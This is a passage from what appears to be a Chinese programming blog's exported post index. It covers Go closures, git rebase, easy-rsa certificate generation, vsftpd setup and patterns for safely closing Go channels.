最终 `runtime.main` **调用go test 命令生成的 main.main 函数**, 在 `_test/_testmain.go` 文件\n4. 然后调用 `testing.Main`, 改函数执行各个例子函数\n\n另外, 从这个例子我们可以发现, 我们自己写的 `main.main` 函数所在的 `main` 包也 可以被其他包导入. 但是其他包导入之后的 `main` 包里的 `main` 函数就不再是 `main.main` 函数了. 因此, 程序的入口也就不是自己写的 `main.main` 函数了.\n\n\n\n## 总结\n\nGo 语言 `runtime` 包的 `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` 等函数虽然看起来比较简单, 但是功能却非常强大.\n\n这几个函数不仅可以解决一些实际的工程问题 , 而且非常适合用于调试和分析各种Go程序的运行时信息.\n","tags":["golang"],"categories":["4_golang实战"]},{"title":"golang闭包的坑","url":"%2Fp%2F4c5612cb.html","content":"\n### 1. 循环内goroutine使用闭包\n\n```go\nfunc main() {\n\ts := []string{\"a\", \"b\", \"c\"}\n\tfor _, v := range s {\n\t\tgo func() {\n\t\t\tfmt.Println(v)\n\t\t}()\n\t}\n\n\ttime.Sleep(time.Second)\n}\n\n\n// c c c \n```\n\n改进:\n\n```go\nfunc main() {                \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func(v string) {\n            fmt.Println(v)\n        }(v)      \n    }                                                                            \n}\n// a b c\n\n\nfunc main() {\n\ts := []string{\"a\", \"b\", \"c\"}\n\tfor _, v := range s {\n\t\tvv := v\n\t\tgo func() {\n\t\t\tfmt.Println(vv)\n\t\t}()\n\t}\n\n\ttime.Sleep(time.Second)\n}\n// a b c\n```\n\n<!-- more -->\n\n### 2. 循环内闭包函数列表\n\n```go\nfunc test() []func() {\n    var s []func()\n\n    for i := 0; i < 3; i++ {\n        s = append(s, func() {  \n            fmt.Println(&i, i)\n        })\n    }\n\n    return s    \n}\nfunc main() {\n    for _, f := range test() { \n        f()   \n    }\n}\n\n/*\n0x1400001a0f8 3\n0x1400001a0f8 3\n0x1400001a0f8 3\n*/\n```\n\n改进:\n\n```go\nfunc test() []func() {\n    var s []func()\n    \n    for i := 0; i < 3; i++ {\n        x := i                 \n        s = append(s, func() {\n            fmt.Println(&x, x)\n        })\n    }\n\n    return s\n}\nfunc main() {\n    for _, f := range test() {\n        f()\n    }\n}\n\n/*\n0x1400001a0f8 0\n0x1400001a100 1\n0x1400001a108 2\n*/\n```\n\n\n\n### 3. defer延迟调用闭包\n\n```go\nfunc main() {\n\tx, y := 1, 2\n\n\tdefer func(x int) {\n\t\tfmt.Println(\"defer\", \"x\", x, \"y\", y)  // y是闭包引用\n\t}(x)\n\n\tx += 100\n\ty += 100\n\tfmt.Println(\"main\", \"x\", x, \"y\", y)\n}\n\n\n\n/*\nmain x 101 y 102\ndefer x 1 y 102\n*/\n```\n","tags":["golang"],"categories":["1_golang基础"]},{"title":"不会rebase就等于没学过Git","url":"%2Fp%2Fb1718ace.html","content":"\n\n\n## 什么是rebase \n\nRebase对于很多人来说是一个很抽象的概念，也因此它的学习门槛就在于如何了解这个抽象的概念。对于rebase 比较恰当的比喻应该是「移花接木」，简单来讲把你的分支接到别的分支上，稍后我们用几个图来示范merge与rebase 的差异。\n\n\n\n了解rebase之前，我们必须了解什么是base。对Git的使用者而言，在分支中进行开发活动是稀松平常的事情，也因此在合并管理分支时，也就需要了解分支是在哪个时间点哪个提交点分出来的旁支，而长出旁支来的提交点，对于旁支来说就是base commit，也就是base。所以简单来说，rebase其实就是改变分支的base的功能。\n\n \n\n下图是在merge的情况会产生的版本演进的示意图，可以看到在新的分支中所做的变更，在合并之后，一并成为一个新的提交(commit 6)。而commit 1就是New Branch的base。\n\n![1](不会rebase就等于没学过Git/1.png)\n\n\n\n\n\n<!-- more -->\n\n而下图是rebase 的情况下会产生的版本演进的示意图。我们同样是在分支中进行开发的动作，但是在rebase时，与merge不同的是，Git会将分支上所做的变更先暂存起来，接着把newbase (或称新基准点)合并进来，最后直接将刚刚暂存起来的变更在分支上重演，这边用「重演」这个字眼是表示「**rebase不是将提交(commit)复制到分支上，而是将整个变更过程一个一个重新套用到分支上**」 ，也就因为如此commit 2'与commit 3'，才会有另外的'符号表示与原本的commit 2 , commit 3不同，这点可以从commit的SHA1凑值不同看出来，虽然变更的内容相同，但是commit编号是不同的。本文会在稍后利用范例演示一遍。\n\n![1](不会rebase就等于没学过Git/2.png)\n\n也就因为如此，所以rebase的行为就很像「移花接木」，以上图来说，就是把New Branch的变更整个接到Master上。这样的好处就是 commit 更像一条直线,更优雅.\n\n \n\n\n\n## Rebase -基础用法\n\n以下我们用一个情境示范rebase的「基础用法」：\n\n> 你是一位team leader，你的其中一项职务就是负责进行程式码审查(code review)，并且将不同程式分支进行合并管理。\n>\n> 现在有2位程式设计师以develop分支为基础，分别开了新的分支feature-a与feature-b，也都已经完工了。你希望利用rebase的方式将这2个分支并入develop中。\n\n 首先，develop的日志如下所示：\n\n```\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n接着，feature-a的日志如下所示:\n\n```\ncommit 15bf9c8954633700211f5b9d246ae67d8135cf29\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n最后是feature-b的日志：\n\n```\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n可以看到feature-a与feature-b分别比develop多出了1, 2个提交。\n\n\n\n身为一名专业的team leader，我们有着足够的信心，相信这2个分支运作的很好，因此我们用以下指令进行rebase。\n\n```\n$ git checkout develop\n$\n$ git rebase feature-a\nFirst, rewinding head to replay your work on top of it...\nFast-forwarded develop to feature-a.\n$\n$ git rebase feature-b\nFirst, rewinding head to replay your work on top of it...\nApplying: add feature_a.c\n```\n\n在上述指令中，我们先切换到develop分支中，接着我们很快的就利用指令git rebase <newbase>合并了feature-a与feature-b。此外，在上述的指令执行结果中，可以看到一行讯息显示Fast-forwarded develop to feature-a，其中的Fast-forwarded是什么意思呢？\n\n> Fast-forwarded指的就是当2个分支的头尾相接时，代表2者之间不会有conflict ，因此只要改HEAD的指向就能够迅速合并了。以本情境为例，develop的最后一个提交正好是feature-a的头，所以这两者的rebase适用Fast-forwarded模式。\n\n接下来，可以用git log看看develop的日志，我们可以从日志中发现feature-a与feature-b的commit ID都不一样了。\n\n```\n$ git log\ncommit 07ef0b8e0b1edd079fb8b69f6e6e215725b5aba4\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n以上就是最简单的rebase过程。\n\n但是在这过程中，有些人可能产生了几个疑问——「为什么先rebase feature-a再rebase feature-b后，会是feature-a的日志在最上方呢？」\n\n这是由于rebase会先找出与newbase之间最近的一个共同base，然后先保留HEAD所在分支(也就是当前分支)从共同base开始的所有变更，接着从共同base开始，将newbase的变更重新套用到HEAD的所在分支后，再将方才所保留的当前分支变更一个一个套用进来，也因此feature-a会是最后的一个commit。\n\n\n\n我们一样以图示进行说明。下图**After rebase feature-a**是rebase feature-a之后的样子，可以看到rebase feature-a之后develop与feature-b的共同base是commit 38844b，因此如果要再rebase feature-b的话，commit 15bf9c会先被暂存起来，先进行rebase feature-b之后，再将刚刚暂存的commit 38844b重演一次，所以在图**After rebase feature-b**中feature-a的commit ID就从338844b变成07ef0b，这就是rebase的过程了。\n\n\n\n![1](不会rebase就等于没学过Git/3.png)\n\nAfter rebase feature-a\n\n\n\n\n\n![1](不会rebase就等于没学过Git/4.png)\n\nAfter rebase feature-b\n\n\n\n\n\n问题又来了，刚刚学的rebase会将整个分支都接上去，有时候我们不需要整个分支都接上去，只要接到分支上的某个提交的点即可，这种情况下可以使用rebase – onto进行。\n\n假设只需要接到feature-b的commit eb6436时，就可以用以下指令进行rebase：\n\n```\n$ git rebase feature-b --onto eb6436\n```\n\n又或者，想要把我们现在的分支整个接到某个分支点上面时，可以选择另一种用法：\n\n```\n$ git rebase --onto <new base-commit> <current base-commit>\n```\n\n例如，我们在feature-b分支上时，想把整个分支接到commit 3908e6 (initial commit)时，可以输入以下指令：\n\n```\n$ git co feature-b #先切换到feature-b\n$ git rebase --onto 3908e6 38844b\n```\n\n下面2 张图就是执行上述指令的前后对照。\n\n![1](不会rebase就等于没学过Git/5.png)\n\nbefore rebase –onto 3908e6 38844b\n\n\n\n![1](不会rebase就等于没学过Git/6.png)\n\nafter rebase –onto 3908e6 38844b\n\n\n\n\n\n## Rebase -进阶互动模式\n\nRebase的互动模式十分强大，可以允许我们交换提交的次序、修改提交内容、合并提交内容，甚至将一个提交拆解成多个提交。\n\n要进入互动模式的基本指令如下，base commit可以是分支上的任意一点：\n\n```\n$ git rebase -i <base commit>\n```\n\n例如，我们想利用互动模式将feature-b上的提交做一些整理时，就可以用以下指令进入互动模式：\n\n```\n$ git rebase -i 38844b\n```\n\n上述指令的意思就是我们希望将feature-b从commit 38844b之后的所有提交(`不含commit 38844b `)进行整理。\n\n接着就会出现类似以下的讯息：\n\n```\npick 1011f14 add feature_b.c\npick d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n在进一步操作前，我们必须对讯息上的几个指令(commands)进行说明：\n\n| pick:   | 保留此提交                                                   |\n| ------- | ------------------------------------------------------------ |\n| reword: | 修改提交的讯息(只改提交讯息)                                 |\n| edit:   | 保留此提交，但是需要做一些修改(例如在程式里面多加些注解)     |\n| squash: | 保留此提交，但是将上面的提交一并并入此提交，此动作会显示提交讯息供人编辑 |\n| fixup:  | 与squash相似，但是此提交的提交讯息会被上面的提交讯息取代     |\n| exec:   | 执行shell指令，例如**exec make test**进行一些测试，可以随意穿插在提交点之间 |\n\n### 变换顺序\n\n接下来，简单示范变换提交的顺序，此处我们想把提交的顺序变成先commit 1011f14再来才是commit d26076a，我们只要简单将上述的rebase讯息换成如下的讯息，也就是两行互换即可，就能够变换顺序了！\n\n```\n# 此处调换次序即可\npick d26076a add #include <stdio.h>\npick 1011f14 add feature_b.c\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n### 修改提交内容\n\n有些时候，我们提交之后，不免会注解忘了加或是程式内还有测试的code忘记清掉。这时候除了用git reset –soft HEAD^之外，也可以用rebase编辑那些需要修正的提交。\n\n例如，我们希望用rebase在commit 1011f14中添加几个提交，就可以将pick改成edit进入编辑状态。\n\n```\npick 1011f14 add feature_b.c\nedit d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n接下来，如果用git status就可以看到我们正在rebase的讯息：\n\n```\n$ git status\nrebase in progress; onto 38844ba\nYou are currently editing a commit while rebasing branch 'Feature-B' on '38844ba'.\n  (use \"git commit --amend\" to amend the current commit)\n  (use \"git rebase --continue\" once you are satisfied with your changes)\n\nnothing to commit, working directory clean\n```\n\n**如果你只是想修正提交讯息**，就可以用以下指令：\n\n```\n$ git commit --amend\n```\n\n**如果你需要多增加几个提交，直接编辑吧**，接着用git add <file> , git commit -m <message>等一般操作进行。最后再利用以下指令完成rebase：\n\n```\n$ git rebase --continue\n```\n\n**又或者，我们现在编辑的提交实在是太大了，可能对程式码审查的人造成困扰，例如同时修正太多个档案，我们希望拆成比较明确的多个提交**，就可以用以下指令回到未提交前的状态：\n\n```\n$ git reset HEAD^\n```\n\n然后就可以用git status列出这个提交中变更了多少档案，然后依照需求一个一个用git add加进去后提交，多提交个几次，就等于是将一个提交拆成多个提交啰！不过别忘了，要用以下指令结束rebase。\n\n```\n$ git rebase --continue\n```\n\n以上就是rebase的几个简单说明与操作。\n\n至于squash , fixup以及exec就留给各位去体验了！\n\n\n\n## Rebase出现问题时的处理方法\n\nRebase与merge一样都可能会产生**conflict**，这时候除了修正**conflict**之后再用git add <file> , git rebase –continue完成rebase之外，也可以用git rebase –abort直接放弃rebase。\n\n```\ngit rebase (--continue | --abort | --skip)\n```\n\n此外，对于rebase使用不慎时，我们会希望能够直接回复到rebase之前的状态，以下就是几个指令可以用来回复到rebase之前的状态。参考自[StackOverFlow](http://stackoverflow.com/questions/134882/undoing-a-git-rebase)。\n\n回复方法1 ：\n\n```\n# 最简单的用法\n$ git reset --hard ORIG_HEAD\n```\n\n回复方法2 ：\n\n```\n# rebase 之前先上tag\n$ git tag BACKUP\n$ ... # rebase 过程\n$ ... # rebase 过程\n$ git reset --hard BACKUP # 失败的话可以直接回复到tag BACKUP\n```\n\n回复方法3 ：\n\n```\n$ git reflog # 寻找要回复的HEAD ，以下假设是HEAD@{3}\n$ git reset --hard HEAD@{3} # 回复\n```","tags":["git"],"categories":["git"]},{"title":"使用esayrsa生成ssl证书","url":"%2Fp%2Fdf25a0d8.html","content":"\n### 下载release版本\n\nhttps://github.com/OpenVPN/easy-rsa/releases\n\n### 配置公钥基础设施变量\n\n```\ncp vars.example vars\nvim vars\n```\n\n修改内容示例\n\n```\nset_var EASYRSA_REQ_COUNTRY \"CN\"\nset_var EASYRSA_REQ_PROVINCE \"BeiJing\"\nset_var EASYRSA_REQ_CITY \"BeiJing\"\nset_var EASYRSA_REQ_ORG \"Wise Innovation Inc.\"\nset_var EASYRSA_REQ_EMAIL \"user@mail.com\"\nset_var EASYRSA_REQ_OU \"Wise Innovation\"\n```\n\n<!-- more -->\n\n### 初始化 easyrsa\n\n1. 初始化\n\n```\n./easyrsa init-pki      # pki/{reqs,private} dir\n```\n\n2.  生成 crt\n\n\n```\n./easyrsa build-ca      # pki/private/ca.key pki/ca.crt\n```\n\n输入密码\n\n\nEnter PEM pass phrase:\n\n\n确认密码\n\n\nVerifying - Enter PEM pass phrase:\n\n\n输入 CA 的名称, 如: Wise Innovation CA\n\n\nCommon Name (eg: your user, host, or server name)[Easy-RSA CA]:\n\n\n\n### 生成server证书 (因为用了通配符, 在 zsh 好像无效, 用 bash 执行命令)\n\n```\n./easyrsa build-server-full *.fhyx.online nopass  //用bash\n```\n\n\n\n   ### 生成client证书\n\n```\n./easyrsa build-client-full kc-spring-001 nopass \n\n./easyrsa build-client-full kc-box-001 nopass\n```","tags":["easyrsa"],"categories":["https"]},{"title":"linux开启ftp服务和golang实现ftp_server_client","url":"%2Fp%2Fd43abcbd.html","content":"\n\n\n### linux 安装 ftp 服务\n\n1 . 安装ftp\n\n```\nsudo apt-get install vsftpd\n```\n\n2. 修改配置  sudo vi /etc/vsftpd.con\n\n```\nlocal_root=/home/ftpuser\nwrite_enable=YES\nanon_mkdir_write_enable=YES\n```\n\n\n3. 添加ftp用户\n\n```\nmkdir /home/ftpuser\nsudo useradd -d /root/workspace -M ftpuser\nsudo passwd ftpuser\n```\n\n4. 调整文件夹权限\n\n```\nchown ftpuser:ftpuser  /home/ftpuser/\nsudo chmod a-w  /home/ftpuser \n```\n\n5. 修改pam.d/vsftpd\n\n```\nsudo vi /etc/pam.d/vsftpd\n#auth    required pam_shells.so //注释掉这一行\nsudo service vsftpd restart\n```\n\n6. 连接\n\n```\nftp://207.246.80.69  //通过浏览器访问\n\nmac 可以下载 filezilla 客户端进行连接\n```\n\n<!-- more -->\n\n## golang 实现 ftp-server ftp-client\n\n### server\n\nhttps://github.com/fclairamb/ftpserver \n\n### client\n\nhttps://github.com/secsy/goftp\n\nhttps://github.com/jlaffaye/ftp\n\n### io progress\n\nhttps://github.com/mitchellh/ioprogress\n\n#### 注意事项:\n\n+ 显示进度的时候要确定总的size\n\n+ 在显示进度的时候要注意设置断点续传的进度\n\n+ 列出file的名字\n\n","tags":["golang"],"categories":["3_golang杂项"]},{"title":"golang优雅的关闭channel","url":"%2Fp%2F8b210700.html","content":"\n\n\n### Channel使用规范\n\n在不能更改channel状态的情况下，没有简单普遍的方式来检查channel是否已经关闭了\n\n关闭已经关闭的channel会导致panic，所以在closer(关闭者)不知道channel是否已经关闭的情况下去关闭channel是很危险的\n\n发送值到已经关闭的channel会导致panic，所以如果sender(发送者)在不知道channel是否已经关闭的情况下去向channel发送值是很危险的\n\n \n\n### The Channel Closing Principle\n\n在使用Go channel的时候，一个适用的原则是*不要从接收端关闭channel，也不要关闭有多个并发发送者的channel*。\n\n换句话说，如果sender(发送者)只是唯一的sender或者是channel最后一个活跃的sender，那么你应该在sender的goroutine关闭channel，从而通知receiver(s)(接收者们)已经没有值可以读了。维持这条原则将保证永远不会发生向一个已经关闭的channel发送值或者关闭一个已经关闭的channel。\n\n<!-- more -->\n\n### 打破Channel Closing Principle的解决方案 \n\n \n\n如果你因为某种原因从接收端（receiver side）关闭channel或者在多个发送者中的一个关闭channel，那么你应该使用列在[Golang panic/recover Use Cases](https://link.jianshu.com/?t=http://www.tapirgames.com/blog/golang-panic-use-cases)的函数来安全地发送值到channel中（假设channel的元素类型是T）\n\n \n\n```\nfunc SafeSend(ch chan T, value T) (closed bool) {\n    defer func() {\n        if recover() != nil {\n            // the return result can be altered \n            // in a defer function call\n            closed = true\n        }\n    }()\n    \n    ch <- value // panic if ch is closed\n    return false // <=> closed = false; return\n}\n```\n\n \n\n同样的想法也可以用在从多个goroutine关闭channel中：\n\n\n\n```\nfunc SafeClose(ch chan T) (justClosed bool) {\n\tdefer func() {\n\t\tif recover() != nil {\n\t\t\tjustClosed = false\n\t\t}\n\t}()\n\t\n\t// assume ch != nil here.\n\tclose(ch) // panic if ch is closed\n\treturn true // <=> justClosed = true; return\n}\n```\n\n\n\n很多人喜欢用`sync.Once`来关闭channel：\n\n```\n type MyChannel struct {\n\tC    chan T\n\tonce sync.Once\n}\n\nfunc NewMyChannel() *MyChannel {\n\treturn &MyChannel{C: make(chan T)}\n}\n\nfunc (mc *MyChannel) SafeClose() {\n\tmc.once.Do(func() {\n\t\tclose(mc.C)\n\t})\n}\n```\n\n\n\n要知道golang的设计者不提供SafeClose或者SafeSend方法是有原因的，他们本来就不推荐在消费端或者在并发的多个生产端关闭channel，比如关闭只读channel在语法上就彻底被禁止使用了。\n\n \n\n### 优雅的关闭Channel的方法\n\n上文的SafeSend方法一个很大的劣势在于它不能用在select块的case语句中。而另一个很重要的劣势在于像我这样对代码有洁癖的人来说，使用panic/recover和sync/mutex来搞定不是那么的优雅。下面我们引入在不同的场景下可以使用的纯粹的优雅的解决方法。\n\n \n\n#### 多个消费者，单个生产者。\n\n这种情况最简单，直接让生产者关闭channel好了。 \n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 100\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\n\tdataCh := make(chan int, 100)\n\t\n\t// 一个生产者\n\tgo func() {\n\t\tfor {\n\t\t\tif value := rand.Intn(MaxRandomNumber); value == 0 {\n\t\t\t\tclose(dataCh)\n\t\t\t\treturn\n\t\t\t} else {\t\t\t\n\t\t\t\tdataCh <- value\n\t\t\t}\n\t\t}\n\t}()\n\t\n\t// 多个消费者\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func() {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor value := range dataCh {\n\t\t\t\tlog.Println(value)\n\t\t\t}\n\t\t}()\n\t}\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n#### 多个生产者，单个消费者。\n\n这种情况要比上面的复杂一点。我们不能在消费端关闭channel，因为这违背了channel关闭原则。但是我们可以让消费端关闭一个附加的信号来通知发送端停止生产数据。\n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(1)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{})\n\t\n\t\n\t// 多个生产者\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func() {\n\t\t\tfor {\n\t\t\n\t\t\t\t// 目的是尝试退出, 因为越早越好, 此处可以省略, 因为就算多发送了值, 消费者也不会理会了\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- rand.Intn(MaxRandomNumber):\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\t}\n\t\n\t// 一个消费者\n\tgo func() {\n\t\tdefer wgReceivers.Done()\n\t\t\n\t\tfor value := range dataCh {\n\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\n\t\t\t\t// 这里即是dataCh 的消费者, 也是 stopCh 的生产者\n\t\t\t\tclose(stopCh)\n\t\t\t\treturn\n\t\t\t}\n\t\t\t\n\t\t\tlog.Println(value)\n\t\t}\n\t}()\n\t\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n就上面这个例子，生产者同时也是退出信号channel的接受者，退出信号channel仍然是由它的生产端关闭的，所以这仍然没有违背**channel关闭原则**。值得注意的是，这个例子中生产端和接受端都没有关闭消息数据的channel，channel在没有任何goroutine引用的时候会自行关闭，而不需要显示进行关闭。\n\n \n\n####  多个生产者，多个消费者\n\n \n\n这是最复杂的一种情况，我们既不能让接受端也不能让发送端关闭channel。我们甚至都不能让接受者关闭一个退出信号来通知生产者停止生产。因为我们不能违反**channel关闭原则**。但是我们可以引入一个额外的协调者来关闭附加的退出信号channel。  \n\n \n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n\t\"strconv\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 10\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{}) //生产者是主持人, 消费者是 (dataCh所有生产者和消费者)\n\t\n\ttoStop := make(chan string, 1) //作用是通知主持人去关闭stopCh, 生产者是 (dataCh所有生产者和消费者) 消费者是主持人\n\t\t\n\t\n\tvar stoppedBy string\n\t\n\t// 主持人\n\tgo func() {\n\t\tstoppedBy = <- toStop\n\t\tclose(stopCh)\n\t}()\n\t\n\t// 多个生产者\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func(id string) {\n\t\t\tfor {\n\t\t\t\tvalue := rand.Intn(MaxRandomNumber)\n\t\t\t\tif value == 0 {\n\t\t\t\t\t//通知主持人去干关闭的活\n\t\t\t\t\tselect {\n\t\t\t\t\tcase toStop <- \"sender#\" + id:\n\t\t\t\t\tdefault:\n\t\t\t\t\t}\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n                //尝试尽早退出, 这里不能省略, 因为可能会导致多发送一次\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- value:\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t// 多个消费者\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func(id string) {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor {\n\t\t\t\t//尝试尽早退出, 这里不能省略, 因为可能会导致多接收一次\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n\t\t\t\t//注意此处如果 stopCh 关闭了, 下面也有能 return 不了\n                //因为dataCh也有可能select 到, 所以上一个 select语句不能省略\n                \n                \n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase value := <-dataCh:\n\t\t\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\t\t//通知主持人去干关闭的活\n\t\t\t\t\t\tselect {\n\t\t\t\t\t\tcase toStop <- \"receiver#\" + id:\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tlog.Println(value)\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t\n\twgReceivers.Wait()\n\tlog.Println(\"stopped by\", stoppedBy)\n}\n```\n\n\n\n在这个例子中，仍然遵守着*channel closing principle*。 请注意channel `toStop`的缓冲大小是1.这是为了避免当mederator goroutine 准备好之前第一个通知就已经发送了，导致丢失。\n\n\n\n#### **结论**\n\n没有任何场景值得你去打破channel关闭原则，如果你遇到这样的一种特殊场景，还是建议你好好思考一下自己设计，是不是该重构一下了。\n\n\n\n\n\n#### [个人疑问解答](https://www.jianshu.com/p/d24dfbb33781)\n\n楼主你好, 关于第三个例子有些问题请教\n\n1. value==0时, 为什么还要加个select, 不能直接发送给toStop吗?\n\n```\nif value == 0 {\nselect {\ncase toStop <- \"sender#\" + id:\ndefault:\n}\nreturn\n}\n```\n> 因为可能多个生产者或者多个消费者满足条件, 防止阻塞\n\n\n\n2. select stopCh 为什么写了两次? 第一个select可以省略吗?\n\n```\nselect {\ncase <- stopCh:\n\treturn\ndefault:\n}\n\nselect {\ncase <- stopCh:\n\treturn\ncase dataCh <- value:\n}\n```\n> 为了尽早退出, 因为第二个 Select有可能 select 到dataCh, 虽然已经通知关闭了\n\n\n\n3. toStop的缓冲大小是1, 为了避免准备好之前通知就发送了怎么理解??\n\n   请注意channel toStop的缓冲大小是1.这是为了避免当mederator goroutine 准备好之前第一个通知就已经发送了，导致丢失。\n\n> 因为有缓冲的 发送 happens_before 接收之前, 所以mederator能保证接收到数据\n>\n> 无缓冲的 接收 happens_before 发送之间,  